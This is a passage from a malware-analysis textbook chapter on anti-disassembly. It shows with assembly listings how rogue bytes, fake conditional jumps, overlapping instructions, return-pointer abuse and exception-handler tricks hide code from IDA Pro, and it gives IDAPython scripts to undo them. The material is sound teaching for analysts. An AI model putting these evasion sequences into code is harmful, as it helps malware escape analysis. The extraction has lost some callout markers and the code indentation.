<p class="calibre1">; sub_4011C0+2j</p>
<p class="calibre1">E8 58 C3 90 90        call    near ptr 90D0D521h</p>
<p class="calibre1">In this example, the instruction immediately following the two conditional jump instructions appears to be a call instruction at , beginning with the byte 0xE8. This is not the case, however, as both conditional jump instructions actually point 1 byte beyond the 0xE8 byte. When this fragment is viewed with IDA Pro, the code cross-references shown at  loc_4011C4 will appear in red, rather than the standard blue, because the actual references point inside the instruction at this location, instead of the beginning of the instruction. As a malware analyst, this is your first indication that anti-disassembly may be employed in the sample you are analyzing. </p>
<p class="calibre1">The following is disassembly of the same code, but this time fixed with the D key, to turn the byte immediately following the jnz instruction into data, and the C key to turn the bytes at loc_4011C5 into instructions. </p>
<p class="calibre1">74 03                  jz      short near ptr loc_4011C5</p>
<p class="calibre1">75 01                  jnz     short near ptr loc_4011C5</p>
<p class="calibre1">; -------------------------------------------------------------------</p>
<p class="calibre1">E8                     db 0E8h</p>
<p class="calibre1">; -------------------------------------------------------------------</p>
<p class="calibre1">loc_4011C5:                     ; CODE XREF: sub_4011C0</p>
<p class="calibre1">; sub_4011C0+2j</p>
<p class="calibre1">58                     pop     eax</p>
<p class="calibre1">C3                     retn</p>
<p class="calibre1">The column on the left in these examples shows the bytes that constitute the instruction. Display of this field is optional, but it’s important when learning anti-disassembly. To display these bytes (or turn them off), select <b class="calibre3">Options</b><b class="calibre3">General</b>. The Number of Opcode Bytes option allows you to enter a number for how many bytes you would like to be displayed. </p>
<p class="calibre1">Figure 15-2 shows the sequence of bytes in this example graphically. </p>
<p class="calibre1">JZ</p>
<p class="calibre1">JNZ</p>
<p class="calibre1">POP RET</p>
<p class="calibre1">74 03 75 01 E8</p>
<p class="calibre1">58</p>
<p class="calibre1">C3</p>
<p class="calibre1">CALL</p>
<p class="calibre1"> <i class="calibre4">Figure 15-2: A jz instruction followed by a jnz instruction</i> Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">335</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p369"/> <i class="calibre4"><b class="calibre3">A Jump Instruction with a Constant Condition</b></i></p>
<p class="calibre1">Another anti-disassembly technique commonly found in the wild is composed of a single conditional jump instruction placed where the condition will always be the same. The following code uses this technique: 33 C0                  xor     eax, eax</p>
<p class="calibre1">74 01                  jz      short near ptr loc_4011C4+1</p>
<p class="calibre1">loc_4011C4:                             ; CODE XREF: 004011C2j</p>
<p class="calibre1">; DATA XREF: .rdata:004020ACo</p>
<p class="calibre1">E9 58 C3 68 94         jmp     near ptr 94A8D521h</p>
<p class="calibre1">Notice that this code begins with the instruction xor eax, eax. This instruction will set the EAX register to zero and, as a byproduct, set the zero flag. The next instruction is a conditional jump that will jump if the zero flag is set. In reality, this is not conditional at all, since we can guarantee that the zero flag will always be set at this point in the program. </p>
<p class="calibre1">As discussed previously, the disassembler will process the false branch first, which will produce conflicting code with the true branch, and since it processed the false branch first, it trusts that branch more. As you’ve learned, you can use the D key on the keyboard while your cursor is on a line of code to turn the code into data, and pressing the C key will turn the data into code. Using these two keyboard shortcuts, a malware analyst could fix this fragment and have it show the real path of execution, as follows: 33 C0                  xor     eax, eax</p>
<p class="calibre1">74 01                  jz      short near ptr loc_4011C5</p>
<p class="calibre1">; --------------------------------------------------------------------</p>
<p class="calibre1">E9                     db 0E9h</p>
<p class="calibre1">; --------------------------------------------------------------------</p>
<p class="calibre1">loc_4011C5:                             ; CODE XREF: 004011C2j</p>
<p class="calibre1">; DATA XREF: .rdata:004020ACo</p>
<p class="calibre1">58                     pop     eax</p>
<p class="calibre1">C3                     retn</p>
<p class="calibre1">In this example, the 0xE9 byte is used exactly as the 0xE8 byte in the previous example. E9 is the opcode for a 5-byte jmp instruction, and E8 is the opcode for a 5-byte call instruction. In each case, by tricking the disassembler into disassembling this location, the 4 bytes following this opcode are effectively hidden from view. Figure 15-3 shows this example graphically. </p>
<p class="calibre1">XOR</p>
<p class="calibre1">JZ</p>
<p class="calibre1">POP</p>
<p class="calibre1">RET</p>
<p class="calibre1">33</p>
<p class="calibre1">C0</p>
<p class="calibre1">74</p>
<p class="calibre1">01</p>
<p class="calibre1">E9</p>
<p class="calibre1">58</p>
<p class="calibre1">C3</p>
<p class="calibre1">JMP</p>
<p class="calibre1"> <i class="calibre4">Figure 15-3: False conditional of xor followed by a jz instruction</i> <b class="calibre3">336</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p370"/> <i class="calibre4"><b class="calibre3">Impossible Disassembly</b></i></p>
<p class="calibre1">In the previous sections, we examined code that was improperly disassembled by the first attempt made by the disassembler, but with an interactive disassembler like IDA Pro, we were able to work with the disassembly and have it produce accurate results. However, under some conditions, no traditional assembly listing will accurately represent the instructions that are executed. We use the term  <i class="calibre4">impossible disassembly</i> for such conditions, but the term isn’t strictly accurate. You could disassemble these techniques, but you would need a vastly different representation of code than what is currently provided by disassemblers. </p>
<p class="calibre1">The simple anti-disassembly techniques we have discussed use a data byte placed strategically after a conditional jump instruction, with the idea that disassembly starting at this byte will prevent the real instruction that follows from being disassembled because the byte that is inserted is the opcode for a multibyte instruction. We’ll call this a  <i class="calibre4">rogue byte</i> because it is not part of the program and is only in the code to throw off the disassembler. In all of these examples, the rogue byte can be ignored. </p>
<p class="calibre1">But what if the rogue byte can’t be ignored? What if it is part of a legitimate instruction that is actually executed at runtime? Here, we encounter a tricky scenario where any given byte may be a part of multiple instructions that are executed. No disassembler currently on the market will represent a single byte as being part of two instructions, yet the processor has no such limitation. </p>
<p class="calibre1">Figure 15-4 shows an example. The first instruction in this 4-byte sequence is a 2-byte jmp instruction. The target of the jump is the second byte of itself. </p>
<p class="calibre1">This doesn’t cause an error, because the byte FF is the first byte of the next 2-byte instruction, inc eax. </p>
<p class="calibre1">JMP −1</p>
<p class="calibre1">EB</p>
<p class="calibre1">FF</p>
<p class="calibre1">C0</p>
<p class="calibre1">48</p>
<p class="calibre1">INC EAX DEC EAX</p>
<p class="calibre1"> <i class="calibre4">Figure 15-4: Inward-pointing jmp instruction</i></p>
<p class="calibre1">The predicament when trying to represent this sequence in disassembly is that if we choose to represent the FF byte as part of the jmp instruction, then it won’t be available to be shown as the beginning of the inc eax instruction. The FF byte is a part of both instructions that actually execute, and our modern disassemblers have no way of representing this. This 4-byte sequence increments EAX, and then decrements it, which is effectively a complicated NOP sequence. It could be inserted at almost any location within a program to break the chain of valid disassembly. To solve this problem, a malware analyst could choose to replace this entire sequence with NOP instructions using an IDC or IDAPython script that calls the PatchByte function. Another alternative is to simply turn it all into data with the D key, so that disassembly will resume as expected at the end of the 4 bytes. </p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">337</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p371"/>For a glimpse of the complexity that can be achieved with these sorts of instruction sequences, let’s examine a more advanced specimen. Figure 15-5 </p>
<p class="calibre1">shows an example that operates on the same principle as the prior one, where some bytes are part of multiple instructions. </p>
<p class="calibre1">MOV ax, 05EBh</p>
<p class="calibre1">XOR eax, eax</p>
<p class="calibre1">JZ - 7</p>
<p class="calibre1">Fake CALL</p>
<p class="calibre1">66</p>
<p class="calibre1">B8</p>
<p class="calibre1">EB</p>
<p class="calibre1">05</p>
<p class="calibre1">31</p>
<p class="calibre1">C0</p>
<p class="calibre1">74</p>
<p class="calibre1">F9</p>
<p class="calibre1">E8</p>
<p class="calibre1">JMP 5</p>
<p class="calibre1">Real Code</p>
<p class="calibre1"> <i class="calibre4">Figure 15-5: Multilevel inward-jumping sequence</i></p>
<p class="calibre1">The first instruction in this sequence is a 4-byte mov instruction. The last 2 bytes have been highlighted because they are both part of this instruction and are also their own instruction to be executed later. The first instruction populates the AX register with data. The second instruction, an xor, will zero out this register and set the zero flag. The third instruction is a conditional jump that will jump if the zero flag is set, but it is actually unconditional, since the previous instruction will always set the zero flag. The disassembler will decide to disassemble the instruction immediately following the jz instruction, which will begin with the byte 0xE8, the opcode for a 5-byte call instruction. The instruction beginning with the byte E8 will never execute in reality. </p>
<p class="calibre1">The disassembler in this scenario can’t disassemble the target of the jz instruction because these bytes are already being accurately represented as part of the mov instruction. The code that the jz points to will always be executed, since the zero flag will always be set at this point. The jz instruction points to the middle of the first 4-byte mov instruction. The last 2 bytes of this instruction are the operand that will be moved into the register. When disassembled or executed on their own, they form a jmp instruction that will jump forward 5 bytes from the end of the instruction. </p>
<p class="calibre1">When first viewed in IDA Pro, this sequence will look like the following: 66 B8 EB 05            mov     ax, 5EBh</p>
<p class="calibre1">31 C0                  xor     eax, eax</p>
<p class="calibre1">74 F9                  jz      short near ptr sub_4011C0+1</p>
<p class="calibre1">loc_4011C8:                        </p>
<p class="calibre1">E8 58 C3 90 90         call    near ptr 98A8D525h</p>
<p class="calibre1">Since there is no way to clean up the code so that all executing instructions are represented, we must choose the instructions to leave in. The net side effect of this anti-disassembly sequence is that the EAX register is set to zero. If you manipulate the code with the D and C keys in IDA Pro so that the only instructions visible are the xor instruction and the hidden instructions, your result should look like the following. </p>
<p class="calibre1"><b class="calibre3">338</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p372"/>66                   byte_4011C0     db 66h B8                                   db 0B8h</p>
<p class="calibre1">EB                                   db 0EBh</p>
<p class="calibre1">05                                   db    5</p>
<p class="calibre1">; ------------------------------------------------------------</p>
<p class="calibre1">31 C0                                xor     eax, eax</p>
<p class="calibre1">; ------------------------------------------------------------</p>
<p class="calibre1">74                                   db 74h</p>
<p class="calibre1">F9                                   db 0F9h </p>
<p class="calibre1">E8                                   db 0E8h</p>
<p class="calibre1">; ------------------------------------------------------------</p>
<p class="calibre1">58                                   pop     eax</p>
<p class="calibre1">C3                                   retn  </p>
<p class="calibre1">This is a somewhat acceptable solution because it shows only the instructions that are relevant to understanding the program. However, this solution may interfere with analysis processes such as graphing, since it’s difficult to tell exactly how the xor instruction or the pop and retn sequences are executed. </p>
<p class="calibre1">A more complete solution would be to use the PatchByte function from the IDC scripting language to modify remaining bytes so that they appear as NOP </p>
<p class="calibre1">instructions. </p>
<p class="calibre1">This example has two areas of undisassembled bytes that we need to convert into NOP instructions: 4 bytes starting at memory address 0x004011C0 </p>
<p class="calibre1">and 3 bytes starting at memory address 0x004011C6. The following IDAPython script will convert these bytes into NOP bytes (0x90):</p>
<p class="calibre1">def NopBytes(start, length):</p>
<p class="calibre1">for i in range(0, length):</p>
<p class="calibre1">PatchByte(start + i, 0x90)</p>
<p class="calibre1">MakeCode(start)</p>
<p class="calibre1">NopBytes(0x004011C0, 4)</p>
<p class="calibre1">NopBytes(0x004011C6, 3)</p>
<p class="calibre1">This code takes the long approach by making a utility function called NopBytes to NOP-out a range of bytes. It then uses that utility function against the two ranges that we need to fix. When this script is executed, the resulting disassembly is clean, legible, and logically equivalent to the original: 90                       nop</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">31 C0                    xor     eax, eax</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">90                       nop</p>
<p class="calibre1">58                       pop     eax</p>
<p class="calibre1">C3                       retn</p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">339</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p373"/>The IDAPython script we just crafted worked beautifully for this scenario, but it is limited in its usefulness when applied to new challenges. To reuse the previous script, the malware analyst must decide which offsets and which length of bytes to change to NOP instructions, and manually edit the script with the new values. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">NOP-ing Out Instructions with IDA Pro</b></i></p>
<p class="calibre1">With a little IDA Python knowledge, we can develop a script that allows malware analysts to easily NOP-out instructions as they see fit. The following script establishes the hotkey ALT-N. Once this script is executed, whenever the user presses ALT-N, IDA Pro will NOP-out the instruction that is currently at the cursor location. It will also conveniently advance the cursor to the next instruction to facilitate easy NOP-outs of large blocks of code. </p>
<p class="calibre1">import idaapi</p>
<p class="calibre1">idaapi.CompileLine('static n_key() { RunPythonStatement("nopIt()"); }') AddHotkey("Alt-N", "n_key")</p>
<p class="calibre1">def nopIt():</p>
<p class="calibre1"/>
<p class="calibre1">start = ScreenEA()</p>
<p class="calibre1">end = NextHead(start)</p>
<p class="calibre1">for ea in range(start, end):</p>
<p class="calibre1">PatchByte(ea, 0x90)</p>
<p class="calibre1">Jump(end)</p>
<p class="calibre1">Refresh()</p>
<p class="calibre1"><b class="calibre3">Obscuring Flow Control</b></p>
<p class="calibre1">Modern disassemblers such as IDA Pro do an excellent job of correlating function calls and deducing high-level information based on the knowledge of how functions are related to each other. This type of analysis works well against code written in a standard programming style with a standard compiler, but is easily defeated by the malware author. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">The Function Pointer Problem</b></i></p>
<p class="calibre1">Function pointers are a common programming idiom in the C programming language and are used extensively behind the scenes in C++. Despite this, they still prove to be problematic to a disassembler. </p>
<p class="calibre1">Using function pointers in the intended fashion in a C program can greatly reduce the information that can be automatically deduced about program flow. If function pointers are used in handwritten assembly or crafted in a nonstandard way in source code, the results can be difficult to reverse-engineer without dynamic analysis. </p>
<p class="calibre1">The following assembly listing shows two functions. The second function uses the first through a function pointer. </p>
<p class="calibre1"><b class="calibre3">340</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p374"/>004011C0 sub_4011C0      proc near               ; DATA XREF: sub_4011D0+5o 004011C0</p>
<p class="calibre1">004011C0 arg_0           = dword ptr  8</p>
<p class="calibre1">004011C0</p>
<p class="calibre1">004011C0                 push    ebp</p>
<p class="calibre1">004011C1                 mov     ebp, esp</p>
<p class="calibre1">004011C3                 mov     eax, [ebp+arg_0]</p>
<p class="calibre1">004011C6                 shl     eax, 2</p>
<p class="calibre1">004011C9                 pop     ebp</p>
<p class="calibre1">004011CA                 retn</p>
<p class="calibre1">004011CA sub_4011C0      endp</p>
<p class="calibre1">004011D0 sub_4011D0      proc near               ; CODE XREF: _main+19p 004011D0                                         ; sub_401040+8Bp 004011D0</p>
<p class="calibre1">004011D0 var_4           = dword ptr -4</p>
<p class="calibre1">004011D0 arg_0           = dword ptr  8</p>
<p class="calibre1">004011D0</p>
<p class="calibre1">004011D0                 push    ebp</p>
<p class="calibre1">004011D1                 mov     ebp, esp</p>
<p class="calibre1">004011D3                 push    ecx</p>
<p class="calibre1">004011D4                 push    esi</p>
<p class="calibre1">004011D5                 mov   [ebp+var_4], offset sub_4011C0</p>
<p class="calibre1">004011DC                 push    2Ah</p>
<p class="calibre1">004011DE                 call  [ebp+var_4]</p>
<p class="calibre1">004011E1                 add     esp, 4</p>
<p class="calibre1">004011E4                 mov     esi, eax</p>
<p class="calibre1">004011E6                 mov     eax, [ebp+arg_0]</p>
<p class="calibre1">004011E9                 push    eax</p>
<p class="calibre1">004011EA                 call  [ebp+var_4]</p>
<p class="calibre1">004011ED                 add     esp, 4</p>
<p class="calibre1">004011F0                 lea     eax, [esi+eax+1]</p>
<p class="calibre1">004011F4                 pop     esi</p>
<p class="calibre1">004011F5                 mov     esp, ebp</p>
<p class="calibre1">004011F7                 pop     ebp</p>
<p class="calibre1">004011F8                 retn</p>
<p class="calibre1">004011F8 sub_4011D0      endp</p>
<p class="calibre1">While this example isn’t particularly difficult to reverse-engineer, it does expose one key issue. The function sub_4011C0 is actually called from two different places ( and ) within the sub_4011D0 function, but it shows only one cross-reference at . This is because IDA Pro was able to detect the initial reference to the function when its offset was loaded into a stack variable on line 004011D5. What IDA Pro does not detect, however, is the fact that this function is then called twice from the locations  and . Any function prototype information that would normally be autopropagated to the calling function is also lost. </p>
<p class="calibre1">When used extensively and in combination with other anti-disassembly techniques, function pointers can greatly compound the complexity and difficulty of reverse-engineering. </p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">341</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p375"/> <i class="calibre4"><b class="calibre3">Adding Missing Code Cross-References in IDA Pro</b></i></p>
<p class="calibre1">All of the information not autopropagated upward, such as function argument names, can be added manually as comments by the malware analyst. </p>
<p class="calibre1">In order to add actual cross-references, we must use the IDC language (or IDAPython) to tell IDA Pro that the function sub_4011C0 is actually called from the two locations in the other function. </p>
<p class="calibre1">The IDC function we use is called AddCodeXref. It takes three arguments: the location the reference is from, the location the reference is to, and a flow type. The function can support several different flow types, but for our purposes, the most useful are either fl_CF for a normal call instruction or a fl_JF </p>
<p class="calibre1">for a jump instruction. To fix the previous example assembly code listing in IDA Pro, the following script was executed:</p>
<p class="calibre1">AddCodeXref(0x004011DE, 0x004011C0, fl_CF); </p>
<p class="calibre1">AddCodeXref(0x004011EA, 0x004011C0, fl_CF); </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Return Pointer Abuse</b></i></p>
<p class="calibre1">The call and jmp instructions are not the only instructions to transfer control within a program. The counterpart to the call instruction is retn (also represented as ret). The call instruction acts just like the jmp instruction, except it pushes a return pointer on the stack. The return point will be the memory address immediately following the end of the call instruction itself. </p>
<p class="calibre1">As call is a combination of jmp and push, retn is a combination of pop and jmp. The retn instruction pops the value from the top of the stack and jumps to it. It is typically used to return from a function call, but there is no architectural reason that it can’t be used for general flow control. </p>
<p class="calibre1">When the retn instruction is used in ways other than to return from a function call, even the most intelligent disassemblers can be left in the dark. </p>
<p class="calibre1">The most obvious result of this technique is that the disassembler doesn’t show any code cross-reference to the target being jumped to. Another key benefit of this technique is that the disassembler will prematurely terminate the function. </p>
<p class="calibre1">Let’s examine the following assembly fragment: </p>
<p class="calibre1">004011C0 sub_4011C0      proc near               ; CODE XREF: _main+19p 004011C0                                         ; sub_401040+8Bp 004011C0</p>
<p class="calibre1">004011C0 var_4           = byte ptr -4</p>
<p class="calibre1">004011C0</p>
<p class="calibre1">004011C0                 call    $+5</p>
<p class="calibre1">004011C5                 add     [esp+4+var_4], 5</p>
<p class="calibre1">004011C9                 retn</p>
<p class="calibre1">004011C9 sub_4011C0      endp ; sp-analysis failed</p>
<p class="calibre1">004011C9</p>
<p class="calibre1"><b class="calibre3">342</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p376"/>004011CA ; ------------------------------------------------------------</p>
<p class="calibre1">004011CA                 push    ebp</p>
<p class="calibre1">004011CB                 mov     ebp, esp</p>
<p class="calibre1">004011CD                 mov     eax, [ebp+8]</p>
<p class="calibre1">004011D0                 imul    eax, 2Ah</p>
<p class="calibre1">004011D3                 mov     esp, ebp</p>
<p class="calibre1">004011D5                 pop     ebp</p>
<p class="calibre1">004011D6                 retn</p>
<p class="calibre1">This is a simple function that takes a number and returns the product of that number times 42. Unfortunately, IDA Pro is unable to deduce any meaningful information about this function because it has been defeated by a rogue retn instruction. Notice that it has not detected the presence of an argument to this function. The first three instructions accomplish the task of jumping to the real start of the function. Let’s examine each of these instructions. </p>
<p class="calibre1">The first instruction in this function is call $+5. This instruction simply calls the location immediately following itself, which results in a pointer to this memory location being placed on the stack. In this specific example, the value 0x004011C5 will be placed at the top of the stack after this instruction executes. This is a common instruction found in code that needs to be self-referential or position-independent, and will be covered in more detail in Chapter 19. </p>
<p class="calibre1">The next instruction is add [esp+4+var_4], 5. If you are used to reading IDA Pro disassembly, you might think that this instruction is referencing a stack variable var_4. In this case, IDA Pro’s stack-frame analysis was incorrect, and this instruction was not referencing what would be a normal stack variable, autonamed to var_4 in an ordinary function. This may seem confusing at first, but notice that at the top of the function, var_4 is defined as the constant -4. This means that what is inside the brackets is [esp+4+(-4)], which can also be represented as [esp+0] or simply [esp]. This instruction is adding five to the value at the top of the stack, which was 0x004011C5. The result of the addition instruction is that the value at the top of the stack will be 0x004011CA. </p>
<p class="calibre1">The last instruction in this sequence is the retn instruction, which has the sole purpose of taking this value off the stack and jumping to it. If you examine the code at the location 0x004011CA, it appears to be the legitimate beginning of a rather normal-looking function. This “real” function was determined by IDA Pro to not be part of any function due to the presence of the rogue retn instruction. </p>
<p class="calibre1">To repair this example, we could patch over the first three instructions with NOP instructions and adjust the function boundaries to cover the real function. </p>
<p class="calibre1">To adjust the function boundaries, place the cursor in IDA Pro inside the function you wish to adjust and press ALT-P. Adjust the function end address to the memory address immediately following the last instruction in the function. To replace the first few instructions with nop, refer to the script technique described in “NOP-ing Out Instructions with IDA Pro” on page 340. </p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">343</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p377"/> <i class="calibre4"><b class="calibre3">Misusing Structured Exception Handlers</b></i></p>
<p class="calibre1">The Structured Exception Handling (SEH) mechanism provides a method of flow control that is unable to be followed by disassemblers and will fool debuggers. SEH is a feature of the x86 architecture and is intended to provide a way for the program to handle error conditions intelligently. Programming languages such as C++ and Ada rely heavily on exception handling and translate naturally to SEH when compiled on x86 systems. </p>
<p class="calibre1">Before exploring how to harness SEH to obscure flow control, let’s look at a few basic concepts about how it operates. Exceptions can be triggered for a number of reasons, such as access to an invalid memory region or dividing by zero. Additional software exceptions can be raised by calling the RaiseException function. </p>
<p class="calibre1">The SEH chain is a list of functions designed to handle exceptions within the thread. Each function in the list can either handle the exception or pass it to the next handler in the list. If the exception makes it all the way to the last handler, then it is considered to be an  <i class="calibre4">unhandled exception</i>. </p>
<p class="calibre1">The last exception handler is the piece of code responsible for triggering the familiar message box that informs the user that “an unhandled exception has occurred.” Exceptions happen regularly in most processes, but are handled silently before they make it to this final state of crashing the process and informing the user. </p>
<p class="calibre1">To find the SEH chain, the OS examines the FS segment register. This register contains a segment selector that is used to gain access to the Thread Environment Block (TEB). The first structure within the TEB is the Thread Information Block (TIB). The first element of the TIB (and consequently the first bytes of the TEB) is a pointer to the SEH chain. The SEH chain is a simple linked list of 8-byte data structures called EXCEPTION_REGISTRATION records. </p>
<p class="calibre1">struct _EXCEPTION_REGISTRATION {</p>
<p class="calibre1">DWORD prev; </p>
<p class="calibre1">DWORD handler; </p>
<p class="calibre1">}; </p>
<p class="calibre1">The first element in the EXCEPTION_REGISTRATION record points to the previous record. The second field is a pointer to the handler function. </p>
<p class="calibre1">This linked list operates conceptually as a stack. The first record to be called is the last record to be added to the list. The SEH chain grows and shrinks as layers of exception handlers in a program change due to subroutine calls and nested exception handler blocks. For this reason, SEH records are always built on the stack. </p>
<p class="calibre1">In order to use SEH to achieve covert flow control, we need not concern ourselves with how many exception records are currently in the chain. We just need to understand how to add our own handler to the top of this list, as shown in Figure 15-6. </p>
<p class="calibre1"><b class="calibre3">344</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p378"/>FS:[0]</p>
<p class="calibre1">prev handler</p>
<p class="calibre1">Handler Function</p>
<p class="calibre1">prev handler</p>
<p class="calibre1">Handler Function </p>
<p class="calibre1">prev handler</p>
<p class="calibre1">Handler Function</p>
<p class="calibre1">prev handler</p>
<p class="calibre1">Handler Function</p>
<p class="calibre1"> <i class="calibre4">Figure 15-6: Structured Exception Handling (SEH) chain</i> To add a record to this list, we need to construct a new record on the stack. Since the record structure is simply two DWORDs, we can do this with two push instructions. The stack grows upward, so the first push will be the pointer to the handler function, and the second push will be the pointer to the next record. We are trying to add a record to the top of the chain, so the next record in the chain when we finish will be what is currently the top, which is pointed to by fs:[0]. The following code performs this sequence. </p>
<p class="calibre1">push ExceptionHandler</p>
<p class="calibre1">push fs:[0]</p>
<p class="calibre1">mov fs:[0], esp</p>
<p class="calibre1">The ExceptionHandler function will be called first whenever an exception occurs. This action will be subject to the constraints imposed by Microsoft’s Software Data Execution Prevention (Software DEP, also known as SafeSEH). </p>
<p class="calibre1">Software DEP is a security feature that prevents the addition of third-party exception handlers at runtime. For purposes of handwritten assembly code, there are several ways to work around this technology, such as using an assembler that has support for SafeSEH directives. Using Microsoft’s C compilers, an author can add /SAFESEH:NO to the linker command line to disable this. </p>
<p class="calibre1">When the ExceptionHandler code is called, the stack will be drastically altered. Luckily, it is not essential for our purposes to fully examine all the data that is added to the stack at this point. We must simply understand how to return the stack to its original position prior to the exception. Remember that our goal is to obscure flow control and not to properly handle program exceptions. </p>
<p class="calibre1">The OS adds another SEH handler when our handler is called. To return the program to normal operation, we need to unlink not just our handler, but this handler as well. Therefore, we need to pull our original stack pointer from esp+8 instead of esp. </p>
<p class="calibre1">mov esp, [esp+8]</p>
<p class="calibre1">mov eax, fs:[0]</p>
<p class="calibre1">mov eax, [eax]</p>
<p class="calibre1">mov eax, [eax]</p>
<p class="calibre1">mov fs:[0], eax</p>
<p class="calibre1">add esp, 8</p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">345</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p379"/>Let’s bring all this knowledge back to our original goal of obscuring flow control. The following fragment contains a piece of code from a Visual C++ </p>
<p class="calibre1">binary that covertly transfers flow to a subroutine. Since there is no pointer to this function and the disassembler doesn’t understand SEH, it appears as though the subroutine has no references, and the disassembler thinks the code immediately following the triggering of the exception will be executed. </p>
<p class="calibre1">00401050               mov     eax, (offset loc_40106B+1) 00401055                 add     eax, 14h</p>
<p class="calibre1">00401058                 push    eax</p>
<p class="calibre1">00401059                 push    large dword ptr fs:0 ; dwMilliseconds 00401060                 mov     large fs:0, esp</p>
<p class="calibre1">00401067                 xor     ecx, ecx</p>
<p class="calibre1">00401069               div     ecx</p>
<p class="calibre1">0040106B</p>
<p class="calibre1">0040106B loc_40106B:                             ; DATA XREF: sub_401050o 0040106B                 call    near ptr Sleep</p>
<p class="calibre1">00401070                 retn</p>
<p class="calibre1">00401070 sub_401050      endp ; sp-analysis failed</p>
<p class="calibre1">00401070</p>
<p class="calibre1">00401070 ; ------------------------------------------------------------------</p>
<p class="calibre1">00401071                 align 10h</p>
<p class="calibre1">00401080               dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0</p>
<p class="calibre1">00401094                 dd 6808C483h</p>
<p class="calibre1">00401098                 dd offset aMysteryCode  ; "Mystery Code" </p>
<p class="calibre1">0040109C                 dd 2DE8h, 4C48300h, 3 dup(0CCCCCCCCh) In this example, IDA Pro has not only missed the fact that the subroutine at location 401080  was not called, but it also failed to even disassemble this function. This code sets up an exception handler covertly by first setting the register EAX to the value 40106C , and then adding 14h to it to build a pointer to the function 401080. A divide-by-zero exception is triggered by setting ECX to zero with xor ecx, ecx followed by div ecx at , which divides the EAX register by ECX. </p>
<p class="calibre1">Let’s use the C key in IDA Pro to turn the data at location 401080 into code and see what was hidden using this trick. </p>
<p class="calibre1">00401080                 mov     esp, [esp+8]</p>
<p class="calibre1">00401084                 mov     eax, large fs:0</p>
<p class="calibre1">0040108A                 mov     eax, [eax]</p>
<p class="calibre1">0040108C                 mov     eax, [eax]</p>
<p class="calibre1">0040108E                 mov     large fs:0, eax</p>
<p class="calibre1">00401094                 add     esp, 8</p>
<p class="calibre1">00401097                 push    offset aMysteryCode ; "Mystery Code" </p>
<p class="calibre1">0040109C                 call    printf</p>
<p class="calibre1"><b class="calibre3">346</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p380"/><b class="calibre3">Thwarting Stack-Frame Analysis</b></p>
<p class="calibre1">Advanced disassemblers can analyze the instructions in a function to deduce the construction of its stack frame, which allows them to display the local variables and parameters relevant to the function. This information is extremely valuable to a malware analyst, as it allows for the analysis of a single function at one time, and enables the analyst to better understand its inputs, outputs, and construction. </p>
<p class="calibre1">However, analyzing a function to determine the construction of its stack frame is not an exact science. As with many other facets of disassembly, the algorithms used to determine the construction of the stack frame must make certain assumptions and guesses that are reasonable but can usually be exploited by a knowledgeable malware author. </p>
<p class="calibre1">Defeating stack-frame analysis will also prevent the operation of certain analytical techniques, most notably the Hex-Rays Decompiler plug-in for IDA Pro, which produces C-like pseudocode for a function. </p>
<p class="calibre1">Let’s begin by examining a function that has been armored to defeat stack-frame analysis. </p>
<p class="calibre1">00401543     sub_401543      proc near           ; CODE XREF: sub_4012D0+3Cp 00401543                                         ; sub_401328+9Bp 00401543</p>
<p class="calibre1">00401543     arg_F4          = dword ptr  0F8h</p>
<p class="calibre1">00401543     arg_F8          = dword ptr  0FCh</p>
<p class="calibre1">00401543</p>
<p class="calibre1">00401543 000                 sub     esp, 8</p>
<p class="calibre1">00401546 008                 sub     esp, 4</p>
<p class="calibre1">00401549 00C                 cmp     esp, 1000h</p>
<p class="calibre1">0040154F 00C                 jl      short loc_401556</p>
<p class="calibre1">00401551 00C                 add     esp, 4</p>
<p class="calibre1">00401554 008                 jmp     short loc_40155C</p>
<p class="calibre1">00401556     ; --------------------------------------------------------------</p>
<p class="calibre1">00401556</p>
<p class="calibre1">00401556     loc_401556:                        ; CODE XREF: sub_401543+Cj 00401556 00C                 add     esp, 104h</p>
<p class="calibre1">0040155C</p>
<p class="calibre1">0040155C     loc_40155C:                        ; CODE XREF: sub_401543+11j 0040155C -F8</p>
